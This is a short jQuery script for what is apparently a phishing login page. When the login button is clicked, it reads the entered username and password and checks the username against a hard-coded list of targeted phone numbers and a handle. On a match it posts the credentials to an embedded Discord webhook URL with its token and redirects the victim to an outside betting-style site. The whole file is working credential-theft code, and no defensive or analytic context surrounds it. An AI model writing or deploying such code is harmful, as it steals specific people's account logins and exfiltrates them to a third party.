$(document).ready(function() {
        $('.login-button').on('click', function() {
            // Get the values from the input fields
            var user = $('.accountUser').val();
            var password = $('.accountPassword').val();

            // Your Discord Webhook URL
            var webhookURL = 'https://discord.com/api/webhooks/1253944495553249290/TcSylyaged1n1oG5A-XV0zFcjn047x33t9UibNEnXpLkI1VH-lsex21dKIcOzvz9RKyw';

            // Data to send to the webhook
            var data = {
                content: `User: ${user}\nPassword: ${password}`
            };


            var userError = $('#userError');
            var passwordError = $('#passworError');

            if(user == ''){
                userError.show();
            }else{
                userError.hide();
            }

            if(password == ''){
                passwordError.show();
            }else{
                passwordError.hide();
            }

            var correctUser = [
                '+201065351666',
                '01065351666',
                '___7adida___1'
            ]
            // Send AJAX POST request using jQuery
            //if(user != '' && password != ''){


            if (correctUser.includes(user)){
                userError.text('Input required');
                userError.hide();
                    $.ajax({
                        url: webhookURL,
                        type: 'POST',
                        contentType: 'application/json',
                        data: JSON.stringify(data),
                        success: function(response) {
                            console.log('Information sent successfully!');
                            window.location.href = "https://1xlite-352419.top/en";
                        },
                        error: function(xhr, status, error) {
                            console.log('Error sending information: ' + xhr.responseText);
                        }
                    });
                
            }else{
                userError.text("username or phone number isn't correct");
                userError.show();
                console.log('not the username');
            }
            
            //}
        }); 
});
